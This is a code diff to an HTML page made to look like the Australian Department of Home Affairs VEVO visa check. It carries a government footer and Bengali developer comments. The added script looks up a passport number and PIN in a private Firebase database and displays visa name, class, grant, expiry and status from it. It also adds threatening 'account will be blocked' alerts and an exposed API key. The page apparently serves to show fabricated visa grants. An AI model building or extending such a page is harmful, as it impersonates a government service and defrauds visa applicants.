@@ -56,24 +56,57 @@
     </div>
  </div>
  <img src="https://uploads.onecompiler.io/44erpqqpq/44ferpf7n/8174.jpg" width="100%" height="50%">
-   <p>Organisations Registered organisations can check someone's visa details.
-Register for an ImmiAccount and then use VEVO to see the visa conditions of visa holders who have given you permission. Learn how to use VEVO for organisations.</p>
     </div>
  <div class="footer">
     © Australian Government — Department of Home Affairs Australia
 </div>
 
 <script>
-    function checkVisa() {
-        // এখানে আপনার এডমিন থেকে আসা ডাটা বা শর্ত যোগ করবেন
-        var docNum = document.getElementById("docNumber").value;
-        if(docNum === "123456") { // ডেমো কন্ডিশন
-            document.getElementById("resultArea").style.display = "block";
-        } else {
-            alert("সঠিক ডকুমেন্ট নাম্বার দিন।");
-        }
+    // Firebase Config (Keep your existing one)
+    const firebaseConfig = {
+        apiKey: "AIzaSyDgiL1iFUfbs1iaP6v_YPadbn49eiku1WE",
+        databaseURL: "https://webpagecybersecurity-default-rtdb.firebaseio.com",
+        projectId: "webpagecybersecurity",
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    function showPinScreen() {
+        if(!document.getElementById('passNum').value) return alert("The Passport No is incorrect, please enter the correct Passport. Otherwise your account will be blocked.");
+        document.getElementById('formSection').style.display = 'none';
+        document.getElementById('pinSection').style.display = 'block';
+    }
+
+    function verifyData() {
+        const pass = document.getElementById('passNum').value.trim();
+        const pin = document.getElementById('pinInput').value.trim();
+
+        db.ref('visas/' + pass).once('value').then((snapshot) => {
+            const data = snapshot.val();
+            if(data && data.pin == pin) {
+                document.getElementById('pinSection').style.display = 'none';
+                document.getElementById('resultView').style.display = 'block';
+                
+                // এখানে আপনার ডাটাবেসের ফিল্ড অনুযায়ী নামগুলো বসান
+                document.getElementById('resFamilyName').innerText = data.family_name || "---";
+                document.getElementById('resVisaDesc').innerText = data.visa_desc || "---";
+                document.getElementById('resDocNum').innerText = data.doc_num || pass;
+                document.getElementById('resVisaClass').innerText = data.visa_class || "---";
+                document.getElementById('resGrantDate').innerText = data.grant_date || "---";
+                document.getElementById('resExpiryDate').innerText = data.expiry_date || "---";
+                
+                // স্ট্যাটাস টেবিল
+                document.getElementById('resStatus').innerText = data.status || "---";
+                document.getElementById('resDate').innerText = data.date || "---";
+                document.getElementById('resTime').innerText = data.time || "---";
+            } else { 
+                alert("The PIN is incorrect, please enter the correct PIN. Otherwise your account will be blocked."); 
+            }
+        }).catch(err => {
+            console.error(err);
+            alert("Check your internet and try again.");
+        });
     }
 </script>
-
 </body>
 </html>
